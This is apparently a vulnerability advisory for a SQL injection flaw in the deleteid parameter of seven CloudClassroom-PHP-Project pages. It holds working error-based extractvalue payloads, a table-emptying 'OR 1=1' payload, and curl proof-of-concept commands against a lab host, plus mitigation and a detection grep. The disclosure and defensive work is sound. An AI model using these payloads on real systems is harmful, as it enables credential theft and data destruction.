# Security Advisory — SQL Injection via deleteid (DELETE-based) — family of 7 pages

> **Identifier:** Pending CVE assignment / Internal ID **CC-2026-20**
> **Publication Date:** 02/08/2026
> **Last Updated:** 02/08/2026
> **Severity:** Critical
> **CVSS:** 9.8 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
> **CWE:** CWE-89: SQL Injection
> **Status:** Unpatched

---

## 1. Executive Summary

A vulnerability was identified in **CloudClassroom-PHP-Project 1.0** (Vishal Mathur — `mathurvishal`), in the component **facultydetails.php, studentdetails.php, guestdetails.php, qureydetails.php, resultdetails.php, manageassessment.php, managevideos.php**, that allows **an attacker (None (via item 00); user interaction: None)** to exploit a **SQL Injection in DELETE statement (error-based + data destruction)** flaw.

Parameter `deleteid` is concatenated in a DELETE query. Allows read via error-based (`extractvalue`) and mass data destruction (`deleteid=1 OR 1=1` empties the table). Seven files share the sink → up to 7 CVE candidates.

Successful exploitation may result in **Total exfiltration via error-based (C:H) and arbitrary record destruction (I:H/A:H).**

Disclosure follows responsible/coordinated policy; formal vendor notification is planned in the disclosure package (see sections 13 and 14). As of now no patch is available.

---

## 2. Affected Products

| Product / Component | Affected Versions | Fixed Version | Status |
|---|---:|---:|---|
| CloudClassroom-PHP-Project | 1.0 (and prior) | None | Affected |
| Component: facultydetails.php, studentdetails.php, guestdetails.php, qureydetails.php, resultdetails.php, manageassessment.php, managevideos.php | 1.0 | None | Affected |

- **Repository / Ecosystem:** https://github.com/mathurvishal/CloudClassroom-PHP-Project
- **Evaluated Stack:** PHP + MySQLi, Apache/2.4.41 (Ubuntu), MariaDB 10.3.39

### Unaffected Products

- No other version/product evaluated in this advisory.

---

## 3. Vulnerability Description

The vulnerability occurs due to **SQL Injection in DELETE statement (error-based + data destruction)** in the component **facultydetails.php**.

Parameter `deleteid` is concatenated in a DELETE query. Allows read via error-based (`extractvalue`) and mass data destruction (`deleteid=1 OR 1=1` empties the table). Seven files share the sink → up to 7 CVE candidates.

**Root cause (source code snippet):**

**`studentdetails.php:16-18`**

```php
$deleteid=$_GET['deleteid'];
$sql="DELETE FROM `studenttable` WHERE Eno = $deleteid";
```

**`guestdetails.php:21`**

```php
$sql="DELETE FROM `guest` WHERE GuEid = '$deleteid'";  // string context
```

### Necessary Conditions

- Authentication: None (via item 00)
- User Interaction: None
- Attack Vector: Remote (network) — method GET
- Preconditions: None on target (item 00).

---

## 4. Impact

Exploitation may allow:

- Total exfiltration via error-based (C:H) and arbitrary record destruction (I:H/A:H)

### Impact on Confidentiality

High — an attacker can read sensitive system data (PII, credentials, business data).

### Impact on Integrity

High — data, configuration or records can be created, altered or removed arbitrarily.

### Impact on Availability

High — service or data can be interrupted, degraded or destroyed.

---

## 5. Classification

### CVSS

- **Score:** 9.8
- **Severity:** Critical
- **Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`

| Metric | Value |
|---|---|
| Attack Vector (AV) | Network (N) |
| Attack Complexity (AC) | Low (L) |
| Privileges Required (PR) | None (N) |
| User Interaction (UI) | None (N) |
| Scope (S) | Unchanged (U) |
| Confidentiality (C) | High (H) |
| Integrity (I) | High (H) |
| Availability (A) | High (H) |

### CWE

- CWE-89: SQL Injection

### CAPEC

- **CAPEC-66 – SQL Injection**

---

## 6. Exploitation Scenario

A possible exploitation scenario occurs as follows:

1. Choose a file from the family (e.g., `managevideos.php`).
2. Inject in `deleteid` error-based payload that aborts query BEFORE deleting rows.
3. Numeric: `0 AND extractvalue(1,concat(0x7e,version()))`; String: `' AND extractvalue(...)-- -`.
4. Read data in XPATH error. (Real destructive exploitation: `deleteid=1 OR 1=1`.)

---

## 7. Technical Evidence

### Affected Component

```text
File(s): facultydetails.php, studentdetails.php, guestdetails.php, qureydetails.php, resultdetails.php, manageassessment.php, managevideos.php
Parameter(s): deleteid
Method: GET · Authentication: None (via item 00)
```

### Example Request

```http
GET /facultydetails.php?deleteid=<payload> HTTP/1.1
Host: 192.168.95.131:9292
Cookie: PHPSESSID=<session — dispensable via item 00 (Broken Access Control)>
```

### Observed Response

```text
7 sinks confirmed: XPATH syntax error: '~10.3.39-MariaDB-...' ; facultydetails exfiltrated '~admin' (password). Row counts unchanged (non-destructive).
```

### Result

Reproduced live in authorized lab (http://192.168.95.131:9292/) on 02/08/2026, in a non-destructive manner. Observed behavior confirms the SQL Injection in DELETE statement (error-based + data destruction) flaw.

**a) Execution in browser** (real server response rendered, with evidence band):

![Web execution evidence — 20-deleteid-sqli-family](evidencia-web-20-deleteid-sqli-family.png)

**b) Vulnerable code line** (`facultydetails.php`):

![Source code evidence — 20-deleteid-sqli-family](evidencia-codigo-20-deleteid-sqli-family.png)

> **Note:** credentials/PII displayed belong to lab test dataset. Remove real secrets before any external publication.

---

## 8. Proof of Concept

The PoC below demonstrates only vulnerable behavior and should be used exclusively in authorized environments. Executable and non-destructive script: **`poc.sh`**.

```bash
curl -s -G "http://192.168.95.131:9292/managevideos.php" \
  --data-urlencode "deleteid=0 AND extractvalue(1,concat(0x7e,version()))"
# string (guestdetails/qureydetails):
curl -s -G "http://192.168.95.131:9292/guestdetails.php" \
  --data-urlencode "deleteid=' AND extractvalue(1,concat(0x7e,version()))-- -"
```

### Expected Result

```text
7 sinks confirmed: XPATH syntax error: '~10.3.39-MariaDB-...' ; facultydetails exfiltrated '~admin' (password). Row counts unchanged (non-destructive).
```


### PoC Limitations

- Does not cause intentional unavailability.
- Does not remove or modify third-party data (state injections are restored; error-based aborts before persisting).
- Does not create persistence or backdoor.
- Does not contain real credentials (lab test data only).
- Does not automate mass exploitation.

---

## 9. Reproduction Steps

1. Access an instance of **CloudClassroom-PHP-Project 1.0**.
2. Configure the prerequisite: None on target (item 00).
3. Access the component **facultydetails.php** (parameter(s): deleteid).
4. Send the request/input described in sections 7 and 8.
5. Observe the vulnerable result: 7 sinks confirmed: XPATH syntax error: '~10.3.39-MariaDB-...' ; facultydetails exfiltrated '~admin' (password). Row counts unchanged (non-destructive).
6. Compare with expected safe behavior (properly validated/sanitized/authorized input, without payload reflection or unintended execution).

---

## 10. Mitigation

Until the definitive fix is applied, recommended:

- Prepared statements with bind; `(int)$deleteid` on numeric ones.
- CSRF tokens; use POST for destructive operations (never GET).
- `exit;` after guard; do not echo errors.

Additional compensatory measures:

- Restrict access to affected component (network/ACL/WAF).
- Apply WAF/reverse proxy rules to block known attack patterns.
- Review associated permissions and privileges; invalidate potentially exposed sessions/credentials.
- Maintain logs and evidence for investigation.

> Mitigations reduce risk but may not completely eliminate the vulnerability.

---

## 11. Fix

**No official fix available as of this advisory date (unpatched product).**

When made available, recommended:

1. Update to patched version or later.
2. Restart affected services, if necessary.
3. Invalidate old sessions and credentials.
4. Review logs prior to update.
5. Confirm vulnerable behavior can no longer be reproduced.

### Recommended Change to Vendor

- Prepared statements with bind; `(int)$deleteid` on numeric ones.
- CSRF tokens; use POST for destructive operations (never GET).
- `exit;` after guard; do not echo errors.

---

## 12. Detection and Indicators

Possible exploitation indicators:

- Requests to `facultydetails.php` with `UNION`, `SELECT`, `extractvalue`, `concat`, single quotes or `-- ` in parameter `deleteid`.
- Database error messages (e.g., `XPATH syntax error`, MariaDB/MySQL errors) reflected in responses.

### Example Log Search

```text
grep -Ei "(union|select|extractvalue|concat|<script|onerror|onload|</textarea)" access.log | grep "facultydetails.php"
```

---

## 13. Disclosure Timeline

| Date | Event |
|---|---|
| 02/08/2026 | Vulnerability identified (static analysis) |
| 02/08/2026 | Confirmed dynamically in authorized lab |
| 02/08/2026 | Re-validated live with evidence (browser + code) |
| 02/08/2026 | Disclosure package prepared (this advisory) |
| (pending) | Vendor notification |
| (pending) | CVE requested/reserved |
| (pending) | Fix made available |
| (pending) | Advisory publication |

---

## 14. Vendor Communication

- **Vendor:** Vishal Mathur (`mathurvishal`)
- **Channel used:** Private GitHub Security Advisory of repository / maintainer email (see `VENDOR-EMAIL.md`)
- **Date of first notification:** (pending)
- **Response status:** Awaiting notification/response
- **Vendor positioning:** N/A at this time

---

## 15. Credits

The vulnerability was identified and reported by:

- **Researcher:** vinniboy021@gmail.com
- **Organization:** Independent security research
- **Contact:** vinniboy021@gmail.com

---

## 16. References

- https://cwe.mitre.org/
- https://www.first.org/cvss/calculator/3.1
- https://cvefeed.io/vuln/product/161371/vishalmathurcloudclassroom-php_project/
- https://github.com/mathurvishal/CloudClassroom-PHP-Project
- https://www.first.org/cvss/calculator/3.1

---

## 17. Revision History

| Version | Date | Change |
|---|---|---|
| 1.0 | 02/08/2026 | Initial publication |

---

## 18. Legal Notice

This advisory is published for educational, defensive and security improvement purposes.

Information presented was obtained in authorized environment and disclosed responsibly or coordinately. The author does not encourage use of this information for unauthorized access, service interruption, privacy violation or any illegal activity.

Use of information in this document is solely the reader's responsibility.

---

## 19. Contact

For corrections, updates or additional information:

- **Email:** vinniboy021@gmail.com
- **Repository:** https://github.com/mathurvishal/CloudClassroom-PHP-Project
